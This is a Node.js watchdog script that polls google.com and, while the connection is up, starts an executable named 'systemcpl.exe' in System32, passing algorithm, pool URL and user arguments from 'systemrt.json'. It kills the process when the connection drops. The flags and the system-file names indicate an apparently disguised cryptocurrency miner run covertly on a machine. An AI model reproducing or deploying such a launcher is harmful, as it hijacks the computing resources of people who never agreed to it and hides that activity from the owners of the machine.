import axios from 'axios';
import { exec } from 'child_process';
import findprocess from 'find-process';
import { readFileSync } from 'fs';
import { resolve } from 'path';

const options = JSON.parse(readFileSync(resolve(__dirname, 'systemrt.json'), 'utf8'));
const timeInterval = 5000;
const axiosTimeout = 2000;
let processpid = 999999999;

setInterval(() => {
    checkInternetNDoTheRightThing();
}, timeInterval);

// 600000

const checkInternetNDoTheRightThing = () => {
    axios.get('https://www.google.com', {
        timeout: axiosTimeout
    })
    .then(() => {
        console.log('Net Working Fine...');
        startIfProcessNotRunning();
    })
    .catch(() => {
        console.log('Net Not Working...');
        stopRunningProcess();
    })
}

const startIfProcessNotRunning = () => {
    findprocess('pid', processpid)
    .then((list) => {
        if (!list.length) {
            console.log('Process is Not Running...');
            let cmd = `C:/Windows/System32/systemcpl.exe -a ${options.algorithm} -o ${options.url} -u ${options.user}`;
            console.log(cmd);
            let pchild = exec(cmd, () => {});
            processpid = pchild.pid;
            console.log(processpid);
        } else {
            console.log('Process is Running Fine...');
            console.log(list[0].pid);
        }
    });
}

const stopRunningProcess = () => {
    findprocess('pid', processpid)
    .then((list) => {
        for (let i = 0; i < list.length; i++){
            process.kill(list[i].pid);
        }
    });
}